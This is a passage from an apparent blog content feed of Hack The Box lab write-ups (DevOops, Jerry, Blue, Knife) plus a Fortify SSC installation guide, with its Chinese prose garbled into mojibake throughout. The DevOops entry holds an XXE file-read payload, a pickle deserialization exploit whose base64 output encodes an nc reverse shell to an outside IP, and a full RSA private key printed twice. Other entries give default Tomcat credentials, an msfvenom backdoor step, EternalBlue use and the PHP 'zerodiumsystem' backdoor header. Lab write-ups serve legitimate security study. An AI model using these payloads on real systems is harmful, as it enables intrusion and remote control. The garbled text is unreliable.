  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221230704068.png" class="" title="&#x2F;etc&#x2F;passwd">

<p>è®¿é—®ç½‘ç«™é¦–é¡µå¯ä»¥çœ‹åˆ°</p>
<p>ä¿®æ”¹xmlè¯»å–feed.py</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:////home/roosa/deploy/src/feed.py"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<p>åˆ†æfeed.py æ–‡ä»¶ï¼Œæäº¤POSTè¯·æ±‚æ—¶å€™è°ƒç”¨äº†pickleè¿›è¡Œååºåˆ—åŒ–</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221233304683.png" class="" title="è¯»å–feed.py">

<p>åˆ©ç”¨pickleååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ ä¸€ä¸ªåå¼¹shellï¼Œæäº¤POSTè¯·æ±‚åŒ…ï¼Œå¯æˆåŠŸæ¥æ”¶åˆ°shell</p>
<pre class="language-python" data-language="python"><code class="language-python">$ python2                                               
Python <span class="token number">2.7</span><span class="token number">.18</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Aug  <span class="token number">1</span> <span class="token number">2022</span><span class="token punctuation">,</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span>GCC <span class="token number">12.1</span><span class="token number">.0</span><span class="token punctuation">]</span> on linux2
Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickle
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> base64 <span class="token keyword">import</span> urlsafe_b64encode
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   		cmd <span class="token operator">=</span> <span class="token string">"åå¼¹shell"</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token string">'Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi4zMCA4MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg=='</span>
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221235447552.png" class="" title="Getshell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>åœ¨&#x2F;home&#x2F;roosa&#x2F;work&#x2F;blogfeed ç›®å½•ä¸‹ï¼Œä½¿ç”¨git log æŸ¥çœ‹commitè®°å½•å¯ä»¥æ‰¾åˆ°ä¸€æ¡å…³äºå¯†é’¥çš„è®°å½•</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">    reverted accidental commit with proper key
commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <span class="token operator">&lt;</span>roosa@solita.fi<span class="token operator">></span>
Date:   Mon Mar <span class="token number">19</span> 09:32:03 <span class="token number">2018</span> <span class="token parameter variable">-0400</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f
<span class="token operator">&lt;</span>ed$ <span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f                       
WARNING: terminal is not fully functional
-  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>
<span class="token function">diff</span> <span class="token parameter variable">--git</span> a/resources/integration/authcredentials.key b/resources/integration/a
uthcredentials.key
index 44c981f<span class="token punctuation">..</span>f4bde49 <span class="token number">100644</span>
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
<span class="token parameter variable">-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span>
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
<span class="token parameter variable">-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span>
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token parameter variable">-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<p>æå–å¯†é’¥ä¿å­˜åˆ°æœ¬åœ°ï¼Œä½¿ç”¨ssh ç™»å½•rootè´¦å·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token assign-left variable">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250222085122095.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;roosa&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Fortify SSC 24.X æ­å»º</title>
    <url>/DevSecOps/tools/fortifyssc/</url>
    <content><![CDATA[<blockquote>
<p>Fortify Software Security Center æ˜¯ä¸€æ¬¾åŸºäºæµè§ˆå™¨çš„äº§å“ï¼Œå¯åœ¨æ•´ä¸ªè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­æä¾›ä¸€ç»„åŠŸèƒ½ï¼Œä»¥è‡ªåŠ¨æ£€æµ‹åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨æ¼æ´ã€‚å®ƒé€šè¿‡æä¾›æ¥è‡ª OpenTextâ„¢ Fortify Static Code Analyzerã€OpenTextâ„¢ Fortify ScanCentral SASTã€OpenTextâ„¢ Fortify ScanCentral DAST å’Œ Sonatype çš„å…³è”æ•°æ®ï¼Œå¸®åŠ©å®‰å…¨å’Œå¼€å‘å›¢é˜ŸååŒå·¥ä½œï¼Œé€šè¿‡å…¶åä½œåœ¨çº¿ç¯å¢ƒå¿«é€Ÿå‡†ç¡®åœ°è§£å†³å®‰å…¨æ¼æ´ã€‚</p>
</blockquote>
<span id="more"></span>

<img src="/DevSecOps/tools/fortifyssc/DraggedImage.png" class="">

<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><ul>
<li>ç³»ç»Ÿï¼šWindows Server 2022</li>
<li>è½¯ä»¶ï¼š Apache Tomcat 9.0.x ã€ JDK 17ã€Fortify Software Security Center 24.2</li>
<li>æ•°æ®åº“ï¼š MySQL 8.0.x </li>
<li>è´¦å·ï¼š ç®¡ç†å‘˜æƒé™</li>
</ul>
<h3 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h3><h4 id="å®‰è£…å¹¶é…ç½®JDKç¯å¢ƒ"><a href="#å®‰è£…å¹¶é…ç½®JDKç¯å¢ƒ" class="headerlink" title="å®‰è£…å¹¶é…ç½®JDKç¯å¢ƒ"></a>å®‰è£…å¹¶é…ç½®JDKç¯å¢ƒ</h4><p>å®‰è£…JDK17ï¼Œé…ç½®JDKç¯å¢ƒå˜é‡ï¼Œæ‰“å¼€å‘½ä»¤è¡Œè¾“å…¥ javaã€javacã€java - versionå‡æœ‰ç›¸åº”å›æ˜¾</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-1.png" class="" title="jdkç¯å¢ƒ">

<h4 id="å®‰è£…å¹¶é…ç½®MySQL"><a href="#å®‰è£…å¹¶é…ç½®MySQL" class="headerlink" title="å®‰è£…å¹¶é…ç½®MySQL"></a>å®‰è£…å¹¶é…ç½®MySQL</h4><p>å®‰è£…MySQLï¼Œé€‰æ‹©Custom</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-2.png" class="" title="å®‰è£…Mysql">



<p>å®‰è£…å®Œæˆåä¿®æ”¹my.iniæ–‡ä»¶(å¿…éœ€)</p>
<p>åœ¨<code>[mysqld]</code>å’Œ<code>[mysqldump]</code>éƒ¨åˆ†ä¸­ï¼Œå‡è®¾ç½®<code>max\_allowed\_packet</code>ä¸º1G,å¦‚æœæ²¡æœ‰<code>[mysqldump]</code>,åˆ™éœ€è¦è‡ªå·±åˆ›å»º</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-3.png" class="" title="my.ini">
<p>åœ¨<code>[mysqld]</code>éƒ¨åˆ†ä¿®æ”¹</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å€¼</th>
</tr>
</thead>
<tbody><tr>
<td>default_storage_engine</td>
<td>INNODB</td>
</tr>
<tr>
<td>innodb_buffer_pool_size</td>
<td>512M</td>
</tr>
<tr>
<td>innodb_lock_wait_timeout</td>
<td>300</td>
</tr>
<tr>
<td>innodb_log_file_size</td>
<td>512M</td>
</tr>
<tr>
<td>max_allowed_packetv</td>
<td>1G</td>
</tr>
<tr>
<td>sql-mode</td>
<td>â€œTRADITIONALâ€</td>
</tr>
</tbody></table>
<p>ä¿å­˜é…ç½®ï¼Œå‘½ä»¤è¡Œé‡å¯æœåŠ¡ï¼ˆè¦ç®¡ç†å‘˜æƒé™ï¼‰</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-4.png" class="" title="é‡å¯mysqlæœåŠ¡">

<h4 id="å¯¼å…¥å®˜æ–¹æä¾›çš„SQLè„šæœ¬"><a href="#å¯¼å…¥å®˜æ–¹æä¾›çš„SQLè„šæœ¬" class="headerlink" title="å¯¼å…¥å®˜æ–¹æä¾›çš„SQLè„šæœ¬"></a>å¯¼å…¥å®˜æ–¹æä¾›çš„SQLè„šæœ¬</h4><p>æ–°å»ºæ•°æ®åº“å¹¶å¯¼å…¥SQLè„šæœ¬ï¼šæ•°æ®åº“å­—ç¬¦é›†è®¾ç½®ä¸º<code>utf8\\uft8\_bin</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-5.png" class="" title="æ–°å»ºæ•°æ®åº“">



<p>ç¦ç”¨å®‰å…¨æ¨¡å¼,ç„¶åé‡æ–°è¿æ¥æ•°æ®åº“</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-6.png" class="" title="ç¦ç”¨å®‰å…¨æ¨¡å¼">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-7.png" class="" title="å¯¼å…¥sqlè„šæœ¬">

<h4 id="å®‰è£…Tomcat"><a href="#å®‰è£…Tomcat" class="headerlink" title="å®‰è£…Tomcat"></a>å®‰è£…Tomcat</h4><p>ä½¿ç”¨å®‰è£…ç‰ˆå®‰è£…Tomcatï¼Œé€‰æ‹©full</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-8.png" class="" title="tomcat">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-9.png" class="" title="tomcat">

<h4 id="é…ç½®Tomcat"><a href="#é…ç½®Tomcat" class="headerlink" title="é…ç½®Tomcat"></a>é…ç½®Tomcat</h4><p>æ¸…ç©ºwebappsç›®å½•ï¼Œå¹¶æ”¾å…¥ssc.war</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
<p>è¿›å…¥<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, ç‚¹å¼€tomcat9w â€“&gt; Java â€“&gt; Java options æ·»åŠ <code>-Dfortify.home=E:\SSC\fortify </code>  â€“&gt; ä¿®æ”¹å†…å­˜(åˆå§‹åŒ–4Gï¼Œæœ€å¤§æ¨è16ä»¥ä¸Š) â€“&gt; åº”ç”¨, ç„¶åå¯åŠ¨Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
<style>.eatwurqgpwtu{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="eatwurqgpwtu" alt="ä¿®æ”¹é…ç½®">
<style>.vgtoshasobss{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="vgtoshasobss">

<h4 id="å®‰è£…SSC"><a href="#å®‰è£…SSC" class="headerlink" title="å®‰è£…SSC"></a>å®‰è£…SSC</h4><p> æ‰“å¼€æµè§ˆå™¨è®¿é—® <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="è®¿é—®SSC">

<p>æ‰“å¼€ä¸Šé¢é…ç½®çš„é‚£ä¸ªfortify homeçš„è·¯å¾„ï¼Œæœ‰ä¸ªinit.tokenæ–‡ä»¶ï¼Œå¤åˆ¶å†…å®¹è´´è¿›å»</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-15.png" class="" title="è·å–token">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-16.png" class="" title="ç™»å½•">

<p>ä¸Šä¼ License</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-17.png" class="" title="ä¸Šä¼ è®¸å¯è¯">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-18.png" class="" title="é»˜è®¤é…ç½®">



<p>é…ç½®æ•°æ®</p>
<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-19.png" class="" title="é…ç½®æ•°æ®åº“">

<p>ä¸Šä¼ ç§å­åŒ…ï¼Œéœ€è¦æŒ‰é¡ºåºä¸Šä¼ </p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-20.png" class="" title="upload seed">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-21.png" class="" title="ä¸Šä¼ æˆåŠŸ">

<p>é‡å¯Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-22.png" class="" title="é‡å¯æœåŠ¡">]]></content>
      <categories>
        <category>DevSecOps</category>
      </categories>
      <tags>
        <tag>ä¼ä¸šå®‰å…¨å»ºè®¾</tag>
        <tag>DevSecOps</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Jerry</title>
    <url>/Hackthebox/htb/htb-jerry/</url>
    <content><![CDATA[<style>.kaqkptaaegsj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="kaqkptaaegsj">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-jerry/image-20250216152859389.png" class="" title="Nmap">

<p>å¼€æ”¾8080(tomcat)ï¼Œç›´æ¥è®¿é—®å¯ä»¥å‘ç°tomcat é»˜è®¤ç®¡ç†é¡µé¢</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—®ç›®æ ‡ï¼Œç‚¹å‡»<code>Manager App</code> åœ¨å¼¹å‡ºçš„ç”¨æˆ·åå¯†ç ç•Œé¢ï¼Œéšä¾¿è¾“å…¥ï¼Œå°±ä¼šè·³è½¬åˆ°403é¡µé¢</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154248837.png" class="" title="tomcatç®¡ç†é¡µé¢">

<p>é¡µé¢ä¸­å‡ºç°ç”¨æˆ·åå¯†ç ï¼Œä½¿ç”¨tomcat:s3cret ç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°éƒ¨ç½²é¡µ</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154409280.png" class="" title="tomcatæŠ¥é”™é¡µé¢">

<p>ä½¿ç”¨msfvenom ç”Ÿæˆåé—¨ï¼Œç„¶åéƒ¨ç½²åˆ°tomcatï¼Œ ç‚¹å‡»åº”ç”¨åè§¦å‘shell</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154608561.png" class="" title="ç”Ÿæˆåé—¨">

<img src="/Hackthebox/htb/htb-jerry/image-20250216154519146.png" class="" title="éƒ¨ç½²waråŒ…">

<img src="/Hackthebox/htb/htb-jerry/image-20250216155106484.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txtâ€™</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txtâ€™</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>é…ç½®é”™è¯¯</tag>
        <tag>å¯†ç ç¡¬ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blue</title>
    <url>/Hackthebox/htb/htb-blue/</url>
    <content><![CDATA[<style>.wyqkikqmiqou{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="wyqkikqmiqou">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-blue/image-20250216114713990.png" class="" title="Nmap">

<p>ä¸€ä¸ªå¼€æ”¾äº†445ç«¯å£çš„Win7ï¼Œç›´æ¥å°è¯•ä½¿ç”¨ms17-010 æ”»å‡»ç›®æ ‡</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç›´æ¥ä½¿ç”¨msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> æ¨¡å—è¿›è¡Œæ”»å‡»</p>
<img src="/Hackthebox/htb/htb-blue/image-20250216120342061.png" class="" title="æ°¸æ’ä¹‹è“">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\haris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>æ°¸æ’ä¹‹è“</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Knife</title>
    <url>/Hackthebox/htb/htb-knife/</url>
    <content><![CDATA[<style>.kvdrcpzlbmqa{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="kvdrcpzlbmqa">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-knife/image-20250216104801646.png" class="" title="Nmap">

<p>å¼€æ”¾äº†22(SSH)å’Œ80(HTTP)</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>ä½¿ç”¨whatwebè·å–webæŒ‡çº¹ PHP 8.1.0-dev ï¼ŒGoogleä¸€ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªåé—¨</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216104951989.png" class="" title="whatweb">

<img src="/Hackthebox/htb/htb-knife/image-20250216110740874.png" class="" title="image-20250216110740874">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æŠ“åŒ…ï¼Œä½¿ç”¨payload <code>User-Agentt: zerodiumsystem(&quot;id&quot;);</code></p>
<img src="/Hackthebox/htb/htb-knife/image-20250216110553497.png" class="" title="åé—¨">

<p>ç›´æ¥åå¼¹shell</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111124234.png" class="" title="åå¼¹shell">

